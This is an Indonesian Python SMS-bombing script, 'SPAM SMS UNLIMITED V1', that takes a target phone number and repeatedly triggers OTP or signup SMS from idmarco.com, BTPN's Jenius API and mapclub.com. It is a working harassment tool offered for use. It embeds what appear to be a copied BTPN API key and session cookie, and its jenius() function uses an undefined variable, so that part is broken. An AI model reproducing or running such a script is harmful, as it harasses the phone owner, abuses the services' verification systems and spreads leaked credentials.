import os,sys,time,re,requests,json
from requests import post
from time import sleep
def marco():
    ua={
    "Host": "www.idmarco.com",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    d={"phone":no}
    r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
    if r:
        print ("CROOT DI DALAM NO",no)
def jenius():
    ua={
    "accept": "*/*",
    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
    "version": "2.36.1-7565",
    "accept-language": "id",
    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
    "Content-Type": "application/json",
    "Host": "api.btpn.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
    "User-Agent": "okhttp/3.12.1"
    }
    dat=json.dumps({"query":"mutation registerPhone($phone: String!, $language: Language!) {\n  registerPhone(input: {phone: $phone, language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables":{"phone":w,"language":"id"},"operationName":"registerPhone"})
    r=requests.post("https://api.btpn.com/jenius", data=dat, headers=ua).text 
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
    if "ok" in r:
        print ("CROOT DI DALAM NO",no)
    else:
        print ("FAILED ATAU GAGAL")
        sys.exit()
os.system("clear")
time.sleep(1)
print ("\033[1;96m[!] Loading Cuk...")
print ("\033[1;96mOrang sabar disayang tuhan:)")
time.sleep(10)
os.system("clear")
time.sleep(1)
print ("""\033[1;97mSPAM SMS UNLIMITED V1
\033[90m-------------------------------
\033[1;97mCreator:\033[1;96m C4N_CyBer
\033[1;97mYoutube:\033[1;96m CANDRA - NM
\033[1;97mContoh Nomor:\033[1;96m Gunakan 62
\033[90m-------------------------------""")
no = input("\033[1;97mNo Target: \033[1;92m")
for i in range(1,4):
    sleep(1)
    marco()
    jenius()
    mapclub()
print ("\033[1;96m[!] Kalau ada kendala hub.+6285708302016")
sys.exit()
